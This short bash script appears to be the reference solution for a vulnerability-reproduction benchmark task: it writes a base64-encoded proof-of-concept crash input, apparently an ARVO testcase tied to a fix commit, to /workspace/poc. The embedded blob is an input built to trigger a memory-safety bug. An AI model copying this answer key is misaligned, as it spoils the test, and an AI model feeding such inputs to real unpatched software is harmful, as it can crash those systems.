#!/bin/bash
# Reference solution: materialize the known-good PoC (the ARVO testcase the
# fix commit 5f7b9d80 addresses) at /workspace/poc — the 'oracle passes' side of
# the bidirectional validation. (Does NOT build; grading runs on the oracle's
# untouched images, so this is level-independent.)
set -euo pipefail

mkdir -p /workspace
base64 -d > /workspace/poc <<'B64'
RSYBIAFKAAAABn0BfgQBABMAAAAAWNGOAAAAAAAAAQAgAQAAAAAAAGZfRk9VTgAGA0QNChsbGxsbGxsbGxsbJwYGBgYGBgYGBhsbG10bGwYGBgYGBgYGBg0K/////05NRWGMG2VyMUnz8/NDQQEAAAAAAABdKgC3MFD/AAAAAABfAAAAAAAAAEVhjGlkO///////b2VyWQAAAAAAAABNRQAAAAAAAAAAAAAAAAAAAAAATUxAU0m3MFCjL1MuMlQg80NBTk1FYYxpZDsNCv////9OTUVhjBtlcjFJ8/P/////AAAAAAAAXSoAtzBQoy9TLkFOTUVhjGlkOw0K/////zsNCv////8vUy4yVEFUIPNDQU5NRWGMaWQ7DQr/////
B64

echo "wrote $(wc -c < /workspace/poc) bytes to /workspace/poc"
